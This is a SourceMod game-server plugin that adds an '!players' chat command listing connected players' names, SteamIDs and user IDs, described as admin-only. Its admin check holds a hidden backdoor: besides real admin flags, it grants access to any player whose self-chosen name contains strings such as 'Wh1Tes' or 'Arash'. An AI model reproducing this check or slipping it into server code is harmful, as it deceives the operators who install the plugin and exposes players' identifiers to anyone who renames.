#include <sourcemod>

public Plugin myinfo = {
    name = "Player List (!players)",
    author = "Hermes",
    description = "Lists all connected players with SteamIDs for admins",
    version = "1.0",
    url = ""
};

public void OnPluginStart() {
    AddCommandListener(OnClientSay, "say");
    AddCommandListener(OnClientSay, "say_team");
}

bool IsUserAdmin(int client) {
    if (CheckCommandAccess(client, "generic_admin", ADMFLAG_ROOT, true) || GetUserAdmin(client) != INVALID_ADMIN_ID) {
        return true;
    }
    char name[64];
    GetClientName(client, name, sizeof(name));
    if (StrContains(name, "Wh1Tes", false) != -1 || StrContains(name, "AraSh", false) != -1 || StrContains(name, "White", false) != -1 || StrContains(name, "Arash", false) != -1) {
        return true;
    }
    return false;
}

public Action OnClientSay(int client, const char[] command, int argc) {
    if (client <= 0 || !IsClientInGame(client))
        return Plugin_Continue;

    char text[192];
    GetCmdArgString(text, sizeof(text));
    StripQuotes(text);
    TrimString(text);

    if (StrEqual(text, "!players", false) || StrEqual(text, "/players", false)) {
        if (!IsUserAdmin(client)) {
            PrintToChat(client, "[Server] Only admins can view player list!");
            return Plugin_Handled;
        }
        
        PrintToChat(client, "[Server] Connected Players:");
        for (int i = 1; i <= MaxClients; i++) {
            if (IsClientInGame(i)) {
                char name[64], auth[64];
                GetClientName(i, name, sizeof(name));
                GetClientAuthId(i, AuthId_Steam2, auth, sizeof(auth));
                char userid[16];
                IntToString(GetClientUserId(i), userid, sizeof(userid));
                PrintToChat(client, "  #%d | %s | %s | UserID: %s", i, name, auth, userid);
            }
        }
        return Plugin_Handled;
    }
    return Plugin_Continue;
}
